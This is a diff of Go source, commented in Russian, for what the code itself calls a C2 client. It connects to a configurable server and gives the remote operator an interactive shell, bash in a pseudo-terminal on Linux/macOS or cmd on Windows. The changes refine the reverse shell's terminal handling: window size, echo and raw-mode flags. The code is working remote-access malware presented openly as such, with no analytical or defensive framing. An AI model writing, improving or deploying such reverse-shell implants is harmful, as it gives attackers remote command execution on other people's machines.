@@ -15,7 +15,6 @@ import (
 var (
 	serverAddr = flag.String("server", "127.0.0.1:4444", "адрес C2 сервера (IP:PORT)")
 )
-const TIOCGRANTPT = 0x40045430 // Обычно это значение
 
 func main() {
 	flag.Parse()
@@ -43,20 +42,16 @@ func handleConnection(conn net.Conn) {
 	interactiveShell(conn)
 }
 
-// interactiveShell запускает шелл в псевдотерминале (PTY)
 func interactiveShell(conn net.Conn) {
-	// Определяем команду для запуска
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
-		// На Windows PTY не поддерживается нативно, используем обычный cmd
 		cmd = exec.Command("cmd")
 		runWindowsShell(conn, cmd)
 		return
 	} else {
-		cmd = exec.Command("bash")
+		cmd = exec.Command("/bin/bash")
 	}
 
-	// Создаём PTY для Linux/macOS
 	f, err := createPTY(cmd)
 	if err != nil {
 		fmt.Println("[-] Ошибка создания PTY:", err)
@@ -64,17 +59,14 @@ func interactiveShell(conn net.Conn) {
 	}
 	defer f.Close()
 
-	// Запускаем процесс
 	err = cmd.Start()
 	if err != nil {
 		fmt.Println("[-] Ошибка запуска шелла:", err)
 		return
 	}
 
-	// Отключаем таймаут
 	conn.SetReadDeadline(time.Time{})
 
-	// Горутина: сокет -> PTY
 	go func() {
 		buf := make([]byte, 4096)
 		for {
@@ -90,7 +82,6 @@ func interactiveShell(conn net.Conn) {
 		}
 	}()
 
-	// Горутина: PTY -> сокет
 	go func() {
 		buf := make([]byte, 4096)
 		for {
@@ -106,7 +97,6 @@ func interactiveShell(conn net.Conn) {
 		}
 	}()
 
-	// Ждём завершения процесса
 	err = cmd.Wait()
 	if err != nil {
 		fmt.Println("[*] Шелл завершился с ошибкой:", err)
@@ -114,105 +104,122 @@ func interactiveShell(conn net.Conn) {
 		fmt.Println("[*] Шелл завершился")
 	}
 
-	// Восстанавливаем таймаут
 	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 }
 
-// createPTY создаёт псевдотерминал для Linux/macOS
 func createPTY(cmd *exec.Cmd) (*os.File, error) {
-    // 1. Открываем master
-    f, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
-    if err != nil {
-        return nil, fmt.Errorf("не удалось открыть /dev/ptmx: %v", err)
-    }
+	f, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
+	if err != nil {
+		return nil, fmt.Errorf("не удалось открыть /dev/ptmx: %v", err)
+	}
 
-    // 2. Получаем номер slave через TIOCGPTN
-    var num int
-    _, _, errno := syscall.Syscall(
-        syscall.SYS_IOCTL,
-        f.Fd(),
-        syscall.TIOCGPTN,
-        uintptr(unsafe.Pointer(&num)),
-    )
-    if errno != 0 {
-        f.Close()
-        return nil, fmt.Errorf("ошибка TIOCGPTN: %v", errno)
-    }
+	var num int
+	_, _, errno := syscall.Syscall(
+		syscall.SYS_IOCTL,
+		f.Fd(),
+		syscall.TIOCGPTN,
+		uintptr(unsafe.Pointer(&num)),
+	)
+	if errno != 0 {
+		f.Close()
+		return nil, fmt.Errorf("ошибка TIOCGPTN: %v", errno)
+	}
 
-    // 3. Разблокируем slave
-    var unlock int = 0
-    _, _, errno = syscall.Syscall(
-        syscall.SYS_IOCTL,
-        f.Fd(),
-        syscall.TIOCSPTLCK,
-        uintptr(unsafe.Pointer(&unlock)),
-    )
-    if errno != 0 {
-        f.Close()
-        return nil, fmt.Errorf("ошибка разблокировки PTY: %v", errno)
-    }
+	var unlock int = 0
+	_, _, errno = syscall.Syscall(
+		syscall.SYS_IOCTL,
+		f.Fd(),
+		syscall.TIOCSPTLCK,
+		uintptr(unsafe.Pointer(&unlock)),
+	)
+	if errno != 0 {
+		f.Close()
+		return nil, fmt.Errorf("ошибка разблокировки PTY: %v", errno)
+	}
 
-    // 4. Открываем slave
-    slaveName := fmt.Sprintf("/dev/pts/%d", num)
-    slave, err := os.OpenFile(slaveName, os.O_RDWR, 0)
-    if err != nil {
-        f.Close()
-        return nil, fmt.Errorf("не удалось открыть %s: %v", slaveName, err)
-    }
+	slaveName := fmt.Sprintf("/dev/pts/%d", num)
+	slave, err := os.OpenFile(slaveName, os.O_RDWR, 0)
+	if err != nil {
+		f.Close()
+		return nil, fmt.Errorf("не удалось открыть %s: %v", slaveName, err)
+	}
 
-    // 5. Настраиваем raw-режим
-    err = setRawTerminal(slave.Fd())
-    if err != nil {
-        f.Close()
-        slave.Close()
-        return nil, fmt.Errorf("ошибка настройки терминала: %v", err)
-    }
+	err = setTerminalSize(slave.Fd(), 24, 80)
+	if err != nil {
+		f.Close()
+		slave.Close()
+		return nil, fmt.Errorf("ошибка установки размера: %v", err)
+	}
 
-    // 6. Подключаем stdin/stdout/stderr к slave
-    cmd.Stdin = slave
-    cmd.Stdout = slave
-    cmd.Stderr = slave
+	err = setRawTerminal(slave.Fd())
+	if err != nil {
+		f.Close()
+		slave.Close()
+		return nil, fmt.Errorf("ошибка настройки терминала: %v", err)
+	}
 
-    // 7. Настраиваем SysProcAttr
-    // ВАЖНО: Ctty должен быть 0 (stdin), а не дескриптор slave!
-    // Убеждаемся, что дескриптор не будет закрыт до exec
-    cmd.SysProcAttr = &syscall.SysProcAttr{
-        Setsid: true,
-        Setctty: true,
-        Ctty: 0, // Используем stdin (0)
-    }
+	cmd.Stdin = slave
+	cmd.Stdout = slave
+	cmd.Stderr = slave
 
-    return f, nil
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		Setsid:  true,
+		Setctty: true,
+		Ctty:    0,
+	}
+
+	return f, nil
 }
 
-// setRawTerminal переводит терминал в raw-режим (отключает эхо, обработку сигналов и т.д.)
-func setRawTerminal(fd uintptr) error {
-	// Получаем текущие атрибуты терминала
-	var termios syscall.Termios
-	_, _, errno := syscall.Syscall6(
+func setTerminalSize(fd uintptr, rows, cols int) error {
+	ws := winsize{
+		Row:    uint16(rows),
+		Col:    uint16(cols),
+		Xpixel: 0,
+		Ypixel: 0,
+	}
+	_, _, errno := syscall.Syscall(
 		syscall.SYS_IOCTL,
 		fd,
-		syscall.TCGETS, // 0x5401
+		syscall.TIOCSWINSZ,
+		uintptr(unsafe.Pointer(&ws)),
+	)
+	if errno != 0 {
+		return fmt.Errorf("ошибка TIOCSWINSZ: %v", errno)
+	}
+	return nil
+}
+
+func setRawTerminal(fd uintptr) error {
+	var termios syscall.Termios
+	_, _, errno := syscall.Syscall(
+		syscall.SYS_IOCTL,
+		fd,
+		syscall.TCGETS,
 		uintptr(unsafe.Pointer(&termios)),
-		0, 0, 0,
 	)
 	if errno != 0 {
 		return fmt.Errorf("ошибка TCGETS: %v", errno)
 	}
 
-	// Изменяем атрибуты: отключаем эхо, канонический режим, обработку сигналов
-	termios.Lflag &^= syscall.ECHO | syscall.ICANON | syscall.ISIG
-	termios.Iflag &^= syscall.IXON | syscall.ICRNL
-	termios.Oflag &^= syscall.OPOST
+	// Отключаем канонический режим и обработку сигналов
+	termios.Lflag &^= syscall.ICANON | syscall.ISIG
+	// Включаем эхо
+	termios.Lflag |= syscall.ECHO
+
+	// Отключаем только управление потоком (Ctrl+S/Ctrl+Q)
+	termios.Iflag &^= syscall.IXON
+	// НЕ отключаем ICRNL (преобразование \r -> \n)
+	// НЕ отключаем OPOST (обработка вывода)
+
+	// Включаем 8-битные символы
 	termios.Cflag |= syscall.CS8
 
-	// Устанавливаем обновлённые атрибуты
-	_, _, errno = syscall.Syscall6(
+	_, _, errno = syscall.Syscall(
 		syscall.SYS_IOCTL,
 		fd,
-		syscall.TCSETS, // 0x5402
+		syscall.TCSETS,
 		uintptr(unsafe.Pointer(&termios)),
-		0, 0, 0,
 	)
 	if errno != 0 {
 		return fmt.Errorf("ошибка TCSETS: %v", errno)
@@ -221,7 +228,13 @@ func setRawTerminal(fd uintptr) error {
 	return nil
 }
 
-// runWindowsShell для Windows (без PTY, через pipes)
+type winsize struct {
+	Row    uint16
+	Col    uint16
+	Xpixel uint16
+	Ypixel uint16
+}
+
 func runWindowsShell(conn net.Conn, cmd *exec.Cmd) {
 	stdin, err := cmd.StdinPipe()
 	if err != nil {
@@ -298,4 +311,6 @@ func runWindowsShell(conn net.Conn, cmd *exec.Cmd) {
 	} else {
 		fmt.Println("[*] Шелл завершился")
 	}
+
+	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 }
